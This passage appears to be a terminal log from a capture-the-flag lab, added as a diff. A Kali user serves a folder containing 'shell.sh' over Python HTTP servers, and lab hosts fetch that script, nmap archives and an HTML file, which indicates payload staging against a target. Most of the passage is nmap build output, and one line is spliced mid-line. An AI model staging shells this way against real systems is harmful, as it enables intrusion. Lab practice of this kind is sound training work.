@@ -1,0 +1,1162 @@
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo nano /etc/hosts                                   
+[sudo] password for kali: 
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd WORKSPACE 
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ ls    
+shell.sh  thm_contrabando
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ python3 -m 'http.server' 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ python3 -m 'http.server'     
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.48.151.116 - - [05/Oct/2026 10:14:31] "GET / HTTP/1.0" 200 -
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ python3 -m 'http.server' 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.48.151.116 - - [05/Oct/2026 10:17:06] "GET / HTTP/1.0" 200 -
+10.48.151.116 - - [05/Oct/2026 10:28:58] "GET / HTTP/1.0" 200 -
+192.168.135.146 - - [05/Oct/2026 10:51:21] "GET / HTTP/1.1" 200 -
+192.168.135.146 - - [05/Oct/2026 10:51:46] "GET / HTTP/1.1" 200 -
+192.168.135.146 - - [05/Oct/2026 10:52:31] "GET / HTTP/1.1" 200 -
+
+
+
+
+192.168.135.146 - - [05/Oct/2026 10:59:02] "GET / HTTP/1.1" 200 -
+192.168.135.146 - - [05/Oct/2026 11:00:47] "GET / HTTP/1.1" 200 -
+
+10.48.151.116 - - [05/Oct/2026 11:03:58] "GET / HTTP/1.0" 200 -
+10.48.151.116 - - [05/Oct/2026 11:05:06] "GET / HTTP/1.0" 200 -
+
+10.48.175.103 - - [06/Oct/2026 00:04:58] "GET /shell.sh HTTP/1.1" 200 -
+
+10.48.175.103 - - [06/Oct/2026 00:41:22] "GET /nmap-7.991.tar.bz2 HTTP/1.1" 200 -
+10.48.175.103 - - [06/Oct/2026 00:42:53] "GET /shell.sh HTTP/1.1" 200 -
+10.48.175.103 - - [06/Oct/2026 00:44:24] "GET /nmap-7.991.tar.bz2 HTTP/1.1" 200 -
+
+10.48.175.103 - - [06/Oct/2026 01:22:32] code 404, message File not found
+10.48.175.103 - - [06/Oct/2026 01:22:32] "GET /agent HTTP/1.1" 404 -
+10.48.175.103 - - [06/Oct/2026 01:35:44] code 404, message File not found
+10.48.175.103 - - [06/Oct/2026 01:35:44] "GET /agent HTTP/1.1" 404 -
+10.48.175.103 - - [06/Oct/2026 01:41:07] code 404, message File not found
+10.48.175.103 - - [06/Oct/2026 01:41:07] "GET /agent HTTP/1.1" 404 -
+10.48.175.103 - - [06/Oct/2026 01:45:12] "GET /nmap-x64.tar.gz HTTP/1.1" 200 -
+10.48.180.78 - - [06/Oct/2026 10:38:54] "GET /shell.sh HTTP/1.1" 200 -
+
+
+
+10.48.180.78 - - [06/Oct/2026 10:49:17] code 404, message File not found
+10.48.180.78 - - [06/Oct/2026 10:49:17] "GET /jjj.html HTTP/1.1" 404 -
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ nano jjj.html            
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/WORKSPACE]
+└─$ python3 -m 'http.server' 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.48.180.78 - - [06/Oct/2026 10:53:01] "GET /jjj.html HTTP/1.1" 200 -
+10.48.180.78 - - [06/Oct/2026 10:55:47] "GET /jjj.html HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                                                           
+RCE=2 -g -O2 -Wall -fno-strict-aliasing TransportLayerElement.cc -o TransportLayerElement.o
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c eth-linux.c  -fPIC -DPIC -o .libs/eth-linux.o
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c ./fmtutils.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c eth-linux.c -o eth-linux.o >/dev/null 2>&1
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c ./pcap-util.c
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing ARPHeader.cc -o ARPHeader.o
+/bin/bash ../libtool  --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I../include  -I../include   -g -O2 -Wall -c -o fw-none.lo fw-none.c
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN  -c llex.c
+  CC       src/libpcre2_8_la-pcre2_config.lo
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c fw-none.c  -fPIC -DPIC -o .libs/fw-none.o
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c ./savefile.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c fw-none.c -o fw-none.o >/dev/null 2>&1
+/bin/bash ../libtool  --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I../include  -I../include   -g -O2 -Wall -c -o intf.lo intf.c
+  CC       src/libpcre2_8_la-pcre2_context.lo
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c ./sf-pcap.c
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lmem.o lmem.c
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing EthernetHeader.cc -o EthernetHeader.o
+  CC       src/libpcre2_8_la-pcre2_convert.lo
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c intf.c  -fPIC -DPIC -o .libs/intf.o
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lobject.o lobject.c
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c ./sf-pcapng.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c intf.c -o intf.o >/dev/null 2>&1
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lopcodes.o lopcodes.c
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c ./pcap-common.c
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   -g0 FPModel.cc -o FPModel.o
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN  -c lparser.c
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing ICMPv4Header.cc -o ICMPv4Header.o
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c ./bpf_image.c
+/bin/bash ../libtool  --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I../include  -I../include   -g -O2 -Wall -c -o ip.lo ip.c
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c ./bpf_filter.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c ip.c  -fPIC -DPIC -o .libs/ip.o
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c ./bpf_dump.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c ip.c -o ip.o >/dev/null 2>&1
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c scanner.c
+/bin/bash ../libtool  --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I../include  -I../include   -g -O2 -Wall -c -o route-linux.lo route-linux.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c route-linux.c  -fPIC -DPIC -o .libs/route-linux.o
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing ICMPv6Header.cc -o ICMPv6Header.o
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lstate.o lstate.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c route-linux.c -o route-linux.o >/dev/null 2>&1
+gcc -fvisibility=hidden  -fpic -I.  -DBUILDING_PCAP -Dpcap_EXPORTS -DHAVE_CONFIG_H  -g -O2    -c grammar.c
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lstring.o lstring.c
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o ltable.o ltable.c
+/bin/bash ../libtool  --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I../include  -I../include   -g -O2 -Wall -c -o ndisc-linux.lo ndisc-linux.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c ndisc-linux.c  -fPIC -DPIC -o .libs/ndisc-linux.o
+  CC       src/libpcre2_8_la-pcre2_dfa_match.lo
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o ltm.o ltm.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c ndisc-linux.c -o ndisc-linux.o >/dev/null 2>&1
+./config.status --file=libpcap.pc.tmp:./libpcap.pc.in
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing IPv4Header.cc -o IPv4Header.o
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lundump.o lundump.c
+/bin/bash ../libtool  --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I../include  -I../include   -g -O2 -Wall -c -o tun-linux.lo tun-linux.c
+config.status: creating libpcap.pc.tmp
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c tun-linux.c  -fPIC -DPIC -o .libs/tun-linux.o
+mv libpcap.pc.tmp libpcap.pc
+./config.status --file=pcap-config.tmp:./pcap-config.in
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lvm.o lvm.c
+libtool: compile:  gcc -DHAVE_CONFIG_H -I. -I../include -I../include -g -O2 -Wall -c tun-linux.c -o tun-linux.o >/dev/null 2>&1
+config.status: creating pcap-config.tmp
+mv pcap-config.tmp pcap-config
+chmod a+x pcap-config
+ar rc libpcap.a pcap-linux.o fad-getad.o pcap-netfilter-linux.o  pcap.o gencode.o optimize.o nametoaddr.o etherent.o fmtutils.o pcap-util.o savefile.o sf-pcap.o sf-pcapng.o pcap-common.o bpf_image.o bpf_filter.o bpf_dump.o scanner.o grammar.o  
+/bin/bash ../libtool  --tag=CC   --mode=link gcc  -g -O2 -Wall -version-info 1:2:0  -o libdnet.la -rpath /home/kali/Downloads/nmap7-r/lib addr-util.lo addr.lo blob.lo ip-util.lo ip6.lo rand.lo arp-ioctl.lo eth-linux.lo fw-none.lo intf.lo ip.lo route-linux.lo ndisc-linux.lo tun-linux.lo 
+ranlib libpcap.a
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcap'
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   idle_scan.cc -o idle_scan.o
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing IPv6Header.cc -o IPv6Header.o
+libtool: link: gcc -shared  -fPIC -DPIC  .libs/addr-util.o .libs/addr.o .libs/blob.o .libs/ip-util.o .libs/ip6.o .libs/rand.o .libs/arp-ioctl.o .libs/eth-linux.o .libs/fw-none.o .libs/intf.o .libs/ip.o .libs/route-linux.o .libs/ndisc-linux.o .libs/tun-linux.o    -g -O2   -Wl,-soname -Wl,libdnet.so.1 -o .libs/libdnet.so.1.0.2
+libtool: link: (cd ".libs" && rm -f "libdnet.so.1" && ln -s "libdnet.so.1.0.2" "libdnet.so.1")
+libtool: link: (cd ".libs" && rm -f "libdnet.so" && ln -s "libdnet.so.1.0.2" "libdnet.so")
+libtool: link: ar cr .libs/libdnet.a  addr-util.o addr.o blob.o ip-util.o ip6.o rand.o arp-ioctl.o eth-linux.o fw-none.o intf.o ip.o route-linux.o ndisc-linux.o tun-linux.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   MACLookup.cc -o MACLookup.o
+libtool: link: ranlib .libs/libdnet.a
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing TCPHeader.cc -o TCPHeader.o
+libtool: link: ( cd ".libs" && rm -f "libdnet.la" && ln -s "../libdnet.la" "libdnet.la" )
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/src'
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[2]: Nothing to be done for 'all-am'.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nmap_dns.cc -o nmap_dns.o
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing UDPHeader.cc -o UDPHeader.o
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lzio.o lzio.c
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lauxlib.o lauxlib.c
+  CC       src/libpcre2_8_la-pcre2_error.lo
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing RawData.cc -o RawData.o
+  CC       src/libpcre2_8_la-pcre2_extuni.lo
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lbaselib.o lbaselib.c
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lcorolib.o lcorolib.c
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nmap_error.cc -o nmap_error.o
+  CC       src/libpcre2_8_la-pcre2_find_bracket.lo
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o ldblib.o ldblib.c
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing HopByHopHeader.cc -o HopByHopHeader.o
+  CC       src/libpcre2_8_la-pcre2_maketables.lo
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o liolib.o liolib.c
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing DestOptsHeader.cc -o DestOptsHeader.o
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing FragmentHeader.cc -o FragmentHeader.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nmap.cc -o nmap.o
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing RoutingHeader.cc -o RoutingHeader.o
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lmathlib.o lmathlib.c
+  CC       src/libpcre2_8_la-pcre2_match.lo
+  CC       src/libpcre2_8_la-pcre2_match_data.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nmap_ftp.cc -o nmap_ftp.o
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o loadlib.o loadlib.c
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing PacketParser.cc -o PacketParser.o
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o loslib.o loslib.c
+  CC       src/libpcre2_8_la-pcre2_match_next.lo
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lstrlib.o lstrlib.c
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   NmapOps.cc -o NmapOps.o
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing NetBlock.cc -o NetBlock.o
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o ltablib.o ltablib.c
+g++ -c -I../liblinear -I../liblua -I../libdnet-stripped/include -I../libpcre/src  -I../libpcap -I../nbase -I../nsock/include -DHAVE_CONFIG_H -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing massdns.cc -o massdns.o
+  CC       src/libpcre2_8_la-pcre2_newline.lo
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o lutf8lib.o lutf8lib.c
+gcc -O2 -Wall -Wextra -DLUA_COMPAT_5_3  -g -O2 -Wall   -DLUA_USE_POSIX -DLUA_USE_DLOPEN   -c -o linit.o linit.c
+  CC       src/libpcre2_8_la-pcre2_ord2utf.lo
+ar rcu liblua.a lapi.o lcode.o lctype.o ldebug.o ldo.o ldump.o lfunc.o lgc.o llex.o lmem.o lobject.o lopcodes.o lparser.o lstate.o lstring.o ltable.o ltm.o lundump.o lvm.o lzio.o lauxlib.o lbaselib.o lcorolib.o ldblib.o liolib.o lmathlib.o loadlib.o loslib.o lstrlib.o ltablib.o lutf8lib.o linit.o 
+ar: `u' modifier ignored since `D' is the default (see `U')
+ranlib liblua.a
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblua'
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   NmapOutputTable.cc -o NmapOutputTable.o
+  CC       src/libpcre2_8_la-pcre2_pattern_info.lo
+  CC       src/libpcre2_8_la-pcre2_script_run.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nmap_tty.cc -o nmap_tty.o
+  CC       src/libpcre2_8_la-pcre2_serialize.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   osscan2.cc -o osscan2.o
+  CC       src/libpcre2_8_la-pcre2_string_utils.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   osscan.cc -o osscan.o
+  CC       src/libpcre2_8_la-pcre2_study.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   output.cc -o output.o
+  CC       src/libpcre2_8_la-pcre2_substitute.lo
+  CC       src/libpcre2_8_la-pcre2_substring.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   payload.cc -o payload.o
+  CC       src/libpcre2_8_la-pcre2_tables.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   portlist.cc -o portlist.o
+  CC       src/libpcre2_8_la-pcre2_ucd.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   portreasons.cc -o portreasons.o
+  CC       src/libpcre2_8_la-pcre2_valid_utf.lo
+rm -f libnetutil.a
+ar cr libnetutil.a netutil.o packettrace.o PacketElement.o NetworkLayerElement.o TransportLayerElement.o ARPHeader.o EthernetHeader.o ICMPv4Header.o ICMPv6Header.o IPv4Header.o IPv6Header.o TCPHeader.o UDPHeader.o RawData.o HopByHopHeader.o DestOptsHeader.o FragmentHeader.o RoutingHeader.o  PacketParser.o NetBlock.o massdns.o
+ranlib libnetutil.a
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libnetutil'
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   protocols.cc -o protocols.o
+  CC       src/libpcre2_8_la-pcre2_xclass.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   scan_engine.cc -o scan_engine.o
